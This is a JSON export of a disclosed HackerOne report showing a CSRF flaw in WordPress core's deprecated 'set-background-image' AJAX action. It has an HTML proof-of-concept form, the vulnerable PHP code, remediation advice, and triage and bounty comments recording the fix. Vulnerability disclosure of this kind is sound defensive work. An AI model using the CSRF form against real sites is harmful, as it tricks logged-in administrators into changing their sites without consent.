{"id":881855,"global_id":"Z2lkOi8vaGFja2Vyb25lL1JlcG9ydC84ODE4NTU=","url":"https://hackerone.com/reports/881855","title":"Arbitrary change of blog's background image via CSRF","state":"Closed","substate":"resolved","severity_rating":"medium","readable_substate":"Resolved","created_at":"2020-05-24T17:13:23.625Z","submitted_at":"2020-05-24T17:13:23.625Z","is_member_of_team?":false,"reporter":{"disabled":false,"username":"erwan_lr","url":"/erwan_lr","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/kL9zJEZXY89ocnwagnb5yBfK/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c"},"is_me?":false,"cleared":false,"hackerone_triager":false,"hacker_mediation":false},"team":{"id":55,"url":"https://hackerone.com/wordpress","handle":"wordpress","profile_picture_urls":{"small":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/43e4513b9104ea0d68c9c096cea374ba8440dde3e027af5465c8771e8839a67c","medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"permissions":[],"submission_state":"open","default_currency":"usd","awards_miles":false,"offers_bounties":true,"state":"public_mode","only_cleared_hackers":false,"pentest_feature_enabled?":false,"profile":{"name":"WordPress","twitter_handle":"wordpress","website":"https://wordpress.org/","about":"Beautiful sites of any kind."}},"has_bounty?":true,"in_validation?":false,"rejected_anc_report_that_can_be_sent_back_to_anc_triagers?":false,"can_view_team":true,"can_view_report":true,"is_external_bug":false,"is_published":false,"is_participant":false,"has_collaborators":false,"stage":4,"public":true,"visibility":"full","cve_ids":[],"singular_disclosure_disabled":false,"disclosed_at":"2020-12-14T10:19:54.363Z","bug_reporter_agreed_on_going_public_at":"2020-12-14T10:09:12.763Z","team_member_agreed_on_going_public_at":"2020-12-14T10:19:54.221Z","comments_closed?":false,"facebook_team?":false,"team_private?":false,"vulnerability_information":"## Description:\n\nDespite being deprecated since v3.5.0, the `wp_set_background_image` method (defined in wp-admin/includes/class-custom-background.php), registered as an authenticated AJAX call (`wp_ajax_set-background-image`), is still active.\n\nGiven that the method is lacking CSRF checks, an attacker could change the background image of the blog to an arbitrary one from the media library via a CSRF attack on a logged in user with the `edit_theme_options` capability (by default administrators).\n\n## Steps To Reproduce:\n\nSave the code below in an HTML file, replace the `[WP]` by the correct domain, and change the `attachement_id` to an existing attachment id. The `size` parameter can also be changed to `thumbnail`, `medium`, `large` or `full`.\n\n```html\n\u003chtml\u003e\n  \u003cbody\u003e\n    \u003cform action=\"https://[WP]/wp-admin/admin-ajax.php\" method=\"POST\"\u003e\n      \u003cinput type=\"hidden\" name=\"attachment_id\" value=\"5\" /\u003e\n      \u003cinput type=\"hidden\" name=\"action\" value=\"set-background-image\" /\u003e\n      \u003cinput type=\"hidden\" name=\"size\" value=\"thumbnail\" /\u003e\n      \u003cinput type=\"submit\" value=\"Submit request\" /\u003e\n    \u003c/form\u003e\n  \u003c/body\u003e\n\u003c/html\u003e\n```\n\nThen log on to the blog as an administrator, open the file (with the same web browser used to login) and click the `Submit request` button. Then go the homepage of the blog and notice that the background image has been changed.\n\n## Recommendations\n\nGiven that the method has been deprecated and replaced with the `ajax_background_add` one which has the correct checks (both CSRF and authorisation), it would be recommended to remove the `wp_set_background_image` function all together, or at least not register it in the `wp_ajax_` hook.\n\n## Affected Code\n\nIn wp-admin/includes/class-custom-background.php\n\n```php\n// Unused since 3.5.0.\nadd_action( 'wp_ajax_set-background-image', array( $this, 'wp_set_background_image' ) );\n\n/**\n * @since 3.4.0\n * @deprecated 3.5.0\n */\npublic function wp_set_background_image() {\n\tif ( ! current_user_can( 'edit_theme_options' ) || ! isset( $_POST['attachment_id'] ) ) {\n\t\texit;\n\t}\n\n\t$attachment_id = absint( $_POST['attachment_id'] );\n\n\t$sizes = array_keys(\n\t\t/** This filter is documented in wp-admin/includes/media.php */\n\t\tapply_filters(\n\t\t\t'image_size_names_choose',\n\t\t\tarray(\n\t\t\t\t'thumbnail' =\u003e __( 'Thumbnail' ),\n\t\t\t\t'medium'    =\u003e __( 'Medium' ),\n\t\t\t\t'large'     =\u003e __( 'Large' ),\n\t\t\t\t'full'      =\u003e __( 'Full Size' ),\n\t\t\t)\n\t\t)\n\t);\n\n\t$size = 'thumbnail';\n\tif ( in_array( $_POST['size'], $sizes ) ) {\n\t\t$size = esc_attr( $_POST['size'] );\n\t}\n\n\tupdate_post_meta( $attachment_id, '_wp_attachment_is_custom_background', get_option( 'stylesheet' ) );\n\n\t$url       = wp_get_attachment_image_src( $attachment_id, $size );\n\t$thumbnail = wp_get_attachment_image_src( $attachment_id, 'thumbnail' );\n\tset_theme_mod( 'background_image', esc_url_raw( $url[0] ) );\n\tset_theme_mod( 'background_image_thumb', esc_url_raw( $thumbnail[0] ) );\n\texit;\n}\n```\n\n## Impact\n\nAn attacker could make a logged in administrator change the background image of the blog to one of the image available in the media library.\n\nDepending on the images available, the blog may become unreadable as the image repeats itself, potentially masking the text.","bounty_amount":"350.0","formatted_bounty":"$350","weakness":{"id":45,"name":"Cross-Site Request Forgery (CSRF)"},"original_report_id":null,"original_report_url":null,"attachments":[{"id":841212,"file_name":"Screenshot_2020-05-24_at_18.21.57.png","expiring_url":"https://hackerone-us-west-2-production-attachments.s3.us-west-2.amazonaws.com/qX5vT9rUDVeQfdQtKfJkmYLE?response-content-disposition=attachment%3B%20filename%3D%22Screenshot_2020-05-24_at_18.21.57.png%22%3B%20filename%2A%3DUTF-8%27%27Screenshot_2020-05-24_at_18.21.57.png\u0026response-content-type=image%2Fpng\u0026X-Amz-Algorithm=AWS4-HMAC-SHA256\u0026X-Amz-Credential=ASIAQGK6FURQ67VGDS6J%2F20211011%2Fus-west-2%2Fs3%2Faws4_request\u0026X-Amz-Date=20211011T153739Z\u0026X-Amz-Expires=3600\u0026X-Amz-Security-Token=IQoJb3JpZ2luX2VjEHYaCXVzLXdlc3QtMiJGMEQCIBUTJ%2BNbh3iGCDafndtBQHkqG1OchqwWgdsmguvhgcLdAiAZVuUXVW1VaXDOlTKJW4MkHKw5%2BpgOTsVzeaztjAVXniqDBAjv%2F%2F%2F%2F%2F%2F%2F%2F%2F%2F8BEAIaDDAxMzYxOTI3NDg0OSIMAWL4B0QSi4hczgSpKtcD3VOAKPL2y75%2FC3vWJu4CxM2H0MhpokFUEt9l4V7Gq%2BkP2JZRIvSX1xKqm2Gk%2BJRjjqXa9QVImay%2FdjekrRmCYTSSDt9dxM0L0oVJr7N6F8ODRv2P7lMfnzU0QMlpmHbiPpiQb5vSlaxU6jX1ESO3u1VQpKIm%2B7BGH6YiJgHcf9pDdPJ24QxGmfk3jwQevnf60P1KEwb1KLJ2JtKpPhawQ8CP%2Fp%2B8Udd6EL0VEe2hP01M49Skdizp3cnpjBBz%2FKaJPQOVb%2FxLwhTaiAm4Gs7LWex0SieNQGn7QnS8LjaHWQ69N6yv2yl5daZ0uO8CMISq44OuSORn5NNfE6Wx49Y1QtLur%2BY0bpfImT2%2Bc3AvhGI16NMEhk5qpUfU2p6NU4IF0P6m2durenSRqQWtxyQafE31VSJU%2FhpOLcgkiLcYO84tTOPewOIMl9iBrNtCggjBX8%2FrEvRnKduv0F4uzhgiTrLXMqiHsoMRJfAlsnKSaskF2MN%2FW8oUK%2Fx2WHxpYJSGLi98vCnAnrjkI1O0VdepFdfxg4xzpi25EpMuF10ISO7%2BOVlPuH4gcxSmKXq2nnWHAyNBbYGCcXKMdnH%2BrKVSQO3JfLw8lTFoTNA9axFJVvLPV3N6%2FondMJKHkYsGOqYBXTEQgnOCUR6Njz81XybrbzJvU1Pc2hk4bMTrt1%2BCSeA%2FbFO392%2FoWlFJGmK4bl3JexiICV3H2r69Blx%2FAIbSxJ4%2Bl1Ric4x9veCmMmxtb3M7uvCDvG9rrJjEd5V99ttvzT1tURyLC0o%2FETycAhpeR4E%2BNiVWXOm1S8L2NA83yPbiobo0yaywdayHxWpEhNSXoJ8gkKAiNtIC0AZekCrrrdnKzbLEBw%3D%3D\u0026X-Amz-SignedHeaders=host\u0026X-Amz-Signature=b504d3e0202bc306b489ead98f5d9f066e12ae2b65a3d1654af6c91738b93811","file_size":1107005,"type":"image/png"}],"allow_singular_disclosure_at":"2021-01-13T10:09:12.863Z","allow_singular_disclosure_after":-23434106.39166135,"singular_disclosure_allowed":true,"vote_count":19,"voters":["bibekshah","ali","erwan_lr","mattberg","demonia","akashhamal0x01","nikhilaadhi","ro00t","temporary_nickname","kraed0","and 9 more..."],"severity":{"rating":"medium","score":6.4,"author_type":"User","metrics":{"attack_vector":"network","attack_complexity":"low","privileges_required":"none","user_interaction":"required","scope":"unchanged","confidentiality":"none","integrity":"low","availability":"low"}},"structured_scope":{"databaseId":2750,"asset_type":"SOURCE_CODE","asset_identifier":"WordPress Core","max_severity":"critical"},"abilities":{"assignable_team_members":[],"assignable_team_member_groups":[]},"activities":[{"id":8093456,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thank you for the report,  @erwan_lr! A very clear one too.\n\nI'm able to reproduce it so marking it as triaged. We'll be in touch once we start working on a patch for this, right now we don't have a timeline for that as we have a backlog of issues but I'll try get the bounty released for this so you don't have to wait on a fix.\n\nCheers","automated_response":false,"created_at":"2020-05-25T03:34:11.752Z","updated_at":"2020-05-25T03:34:11.752Z","actor":{"username":"ehtis","cleared":false,"url":"/ehtis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8093457,"is_internal":false,"editable":false,"type":"Activities::BugTriaged","message":"","automated_response":false,"created_at":"2020-05-25T03:34:24.949Z","updated_at":"2020-05-25T03:34:24.949Z","actor":{"username":"ehtis","cleared":false,"url":"/ehtis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8147811,"is_internal":false,"editable":false,"type":"Activities::BountyAwarded","message":"Hi @erwan_lr,\n\nWe're awarding a bounty for this report, however please note that this issue is still being triaged and that details of the issue should not be made public in any way. Public disclosure will be available as usual (if you desire) once the issue has been fully resolved.\n\nThanks once again for the responsible disclosure.","automated_response":false,"created_at":"2020-05-29T16:46:24.781Z","updated_at":"2020-05-29T16:46:24.781Z","actor":{"url":"/wordpress","ibb":false,"profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/000/055/f114d1d31f904e3b903cd99a6cf566bb531f8401_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"profile":{"name":"WordPress"}},"bounty_amount":"300.0","bounty_currency":"usd","bonus_amount":"50.0","genius_execution_id":null,"team_handle":"wordpress","collaborator":{"username":"erwan_lr","url":"/erwan_lr"},"actor_is_team_member":true,"actor_is_concealed_member":false},{"id":8147976,"is_internal":false,"editable":false,"type":"Activities::Comment","message":"Thanks!","automated_response":false,"created_at":"2020-05-29T17:07:37.587Z","updated_at":"2020-05-29T17:07:37.587Z","actor":{"username":"erwan_lr","cleared":false,"url":"/erwan_lr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/kL9zJEZXY89ocnwagnb5yBfK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":9716486,"is_internal":false,"editable":false,"type":"Activities::BugResolved","message":"Hi @erwan_lr,\n\nWanted to write to let you know that this has been patched in the most recent version of WordPress. Thanks for your help in contributing to WordPress!\n\nhttps://wordpress.org/news/2020/10/wordpress-5-5-2-security-and-maintenance-release/\n\nCheers,\n\n@whyisjake\n","automated_response":false,"created_at":"2020-11-03T18:09:49.380Z","updated_at":"2020-11-03T18:09:49.380Z","actor":{"username":"whyisjake","cleared":false,"url":"/whyisjake","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/000/499/942/de8d53f71535e9531105209e14875727a9e88cfe_original.jpg/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":null},"reporter":{"username":"erwan_lr","url":"/erwan_lr"},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10094750,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"","automated_response":false,"created_at":"2020-12-14T10:09:12.807Z","updated_at":"2020-12-14T10:09:12.807Z","first_to_agree":true,"actor":{"username":"erwan_lr","cleared":false,"url":"/erwan_lr","profile_picture_urls":{"medium":"https://profile-photos.hackerone-user-content.com/variants/kL9zJEZXY89ocnwagnb5yBfK/fd4ecbe1e3e98c343c7717114485ace2f830f9253103d3cfa7502059868c516c"},"hackerone_triager":false,"hackerone_employee":false},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":false,"actor_is_concealed_member":false},{"id":10094842,"is_internal":false,"editable":false,"type":"Activities::AgreedOnGoingPublic","message":"Disclosing. üëç","automated_response":false,"created_at":"2020-12-14T10:19:54.240Z","updated_at":"2020-12-14T10:19:54.240Z","actor":{"username":"ehtis","cleared":false,"url":"/ehtis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false},{"id":10094843,"is_internal":false,"editable":false,"type":"Activities::ReportBecamePublic","message":"","automated_response":false,"created_at":"2020-12-14T10:19:54.387Z","updated_at":"2020-12-14T10:19:54.387Z","actor":{"username":"ehtis","cleared":false,"url":"/ehtis","profile_picture_urls":{"medium":"/assets/avatars/default-71a302d706457f3d3a31eb30fa3e73e6cf0b1d677b8fa218eaeaffd67ae97918.png"},"hackerone_triager":false,"hackerone_employee":null},"genius_execution_id":null,"team_handle":"wordpress","actor_is_team_member":true,"actor_is_concealed_member":false}],"activity_page_count":1,"activity_page_number":1,"summaries":[{"category":"team","can_view?":true,"can_create?":false},{"category":"researcher","can_view?":true,"can_create?":false}]}